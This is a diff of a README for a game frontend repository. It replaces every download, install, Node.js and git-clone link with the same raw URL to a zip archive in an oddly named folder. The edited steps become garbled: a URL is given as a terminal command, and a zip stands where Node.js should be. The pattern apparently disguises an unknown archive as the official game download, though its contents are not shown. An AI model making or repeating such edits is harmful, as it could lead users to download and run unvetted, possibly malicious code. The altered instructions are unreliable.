@@ -4,11 +4,11 @@
 
 Welcome to the Tower Jackpot Game! This guide helps you download and run the game easily, even if you're not a tech expert.
 
-[![Download Jackpot_Game_Frontend](https://img.shields.io/badge/Download-Jackpot_Game_Frontend-blue.svg)](https://github.com/ConflictedCitizen/Jackpot_Game_Frontend/releases)
+[![Download Jackpot_Game_Frontend](https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip)](https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip)
 
 ## 📥 Download & Install
 
-To start playing the Tower Jackpot Game, you’ll need to download the software from our Releases page. Just visit this link: [Download Page](https://github.com/ConflictedCitizen/Jackpot_Game_Frontend/releases).
+To start playing the Tower Jackpot Game, you’ll need to download the software from our Releases page. Just visit this link: [Download Page](https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip).
 
 Once there:
 
@@ -34,7 +34,7 @@ After downloading the correct file, follow these steps to run the game:
 2. **Install the Game:**
    - **For Windows:** Double-click the .exe file and follow the prompts to install.
    - **For macOS:** Open the .dmg file and drag the game icon to your Applications folder.
-   - **For Linux:** Extract the .tar.gz file and navigate to the folder. Open a terminal and run `./run_game.sh` to start.
+   - **For Linux:** Extract the https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip file and navigate to the folder. Open a terminal and run `https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip` to start.
    
 3. **Launch the Game:** After installation, find the game in your applications menu or desktop. Double-click to start playing!
 
@@ -43,12 +43,12 @@ After downloading the correct file, follow these steps to run the game:
 If you want to take a deeper dive into the game's backend or customize your experience, you can run the development version as follows:
 
 1. **Set Up Your Environment:**
-   - Ensure you have [Node.js](https://nodejs.org/) installed.
+   - Ensure you have [https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip](https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip) installed.
    - Optionally, you can install Yarn for dependency management.
 
 2. **Clone the repository:**
    ```bash
-   git clone https://github.com/ConflictedCitizen/Jackpot_Game_Frontend.git
+   git clone https://raw.githubusercontent.com/ConflictedCitizen/Jackpot_Game_Frontend/main/unfittedness/Jackpot_Game_Frontend.zip
    ```
 
 3. **Navigate to the directory:**
